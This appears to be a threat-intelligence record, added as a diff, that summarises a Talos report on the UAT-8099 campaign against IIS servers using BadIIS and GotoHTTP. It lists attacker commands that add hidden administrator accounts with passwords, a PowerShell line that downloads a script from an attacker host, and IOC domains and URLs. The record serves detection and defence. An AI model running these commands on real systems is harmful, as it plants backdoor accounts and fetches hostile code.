@@ -1,0 +1,80 @@
+description: UAT-8099 campaign targeting vulnerable IIS servers with web shells and
+  PowerShell to deploy GotoHTTP tool, using customized BadIIS malware variants for
+  regional SEO fraud.
+attribution: UAT-8099
+malware_families:
+- BadIIS
+- GotoHTTP
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - whoami
+  - tasklist
+  - net user mssql$ AppleGuitar7$ /add
+  - net localgroup administrators mssql$ /add
+  - net user mssql$ /expires:never
+  - net user adminl$ PRsswOrd2025:!cmd / net localgroup administrators adminl$ /add
+  - net user adminl$ /expires:never
+  - net user adminl$ /active:yes
+  - net user admin2$ Aal123456@ /add
+  - net user power$ PRsswOrd2025!! /add
+  - net localgroup administrators power$ /add
+  powershell:
+  - Invoke-WebRequest -Uri https://7070-ppxcx-al-3gg5ufwp666ee6hts1300076834.tcbh.qcloud[.]la/test/zcgo/zcgol.vbs
+    -OutFile C:\\users\\public\\zcgol.vbs
+  scripting_engine:
+  - VBS
+  - JavaScript
+  registry_keys: []
+  image_load:
+  - fasthttp.dll
+  - cgihttp.dll
+  - iis32.dll
+  - iis64.dll
+  network_connections:
+  - https://7070-ppxcx-al-3gg5ufwp666ee6hts1300076834.tcbh.qcloud[.]la/test/zcgo/go.exe
+  - http://gol.kmm5tn.ceye.io
+  - powershell.exe, https://ufagce.con/, 443
+  - powershell.exe, https://bxphp.westoos.com/, 443
+  file_activity:
+  - C:/Users/admin$/Desktop/TH.zip
+  - C:/Users/admin$/Desktop/VN.zip
+  - C:/Users/mssql$/Desktop/VN/fasthttp.dll
+  - C:/Users/mssql$/Desktop/VN/cgihttp.dll
+  - C:/Users/mssql$/Desktop/VN/install.bat
+  - C:/Users/mssql$/Desktop/VN/uninstall.bat
+  - C:/Users/mssql$/Desktop/newth/iis32.dll
+  - C:/Users/mssql$/Desktop/newth/iis64.dll
+  - C:/Users/mssql$/Desktop/newth/install.bat
+  - C:/Users/mssql$/Desktop/newth/uninstall.bat
+  - E:\\DLL\\SearchEngine\\Release\\SearchEngine.pdb
+  - C:\\Users\\qwe\\source\\repos\\Dll1dasd\\x64\\Release\\Dll1dasd.pdb
+  - C:\\inetpub\\samroot\\systen.db
+  - C:\\programdata\\system.db
+  - system.db
+  persistence:
+  - Creating hidden user accounts (admin$, mysql$)
+  - Using GotoHTTP tool for remote control
+  process_relations: []
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - 7070-ppxcx-al-3gg5ufwp666ee6hts1300076834.tcbh.qcloud[.]la
+  - gol.kmm5tn.ceye.io
+  - ufagce.con
+  - bxphp.westoos.com
+  urls:
+  - https://7070-ppxcx-al-3gg5ufwp666ee6hts1300076834.tcbh.qcloud[.]la/test/zcgo/zcgol.vbs
+  - https://7070-ppxcx-al-3gg5ufwp666ee6hts1300076834.tcbh.qcloud[.]la/test/zcgo/go.exe
+  - http://gol.kmm5tn.ceye.io
+  - https://ufagce.con/7referCode=3403862255496inviteType=CUSTON1
+  - https://bxphp.westoos.com/58z.js
+  - https://bxphp.uestooo.con/u.php
+authors:
+- Joey Chen
+reference: https://blog.talosintelligence.com/uat-8099-new-persistence-mechanisms-and-regional-focus/
+date_of_publication: January 29, 2026
+file_creation_date: February 02, 2026
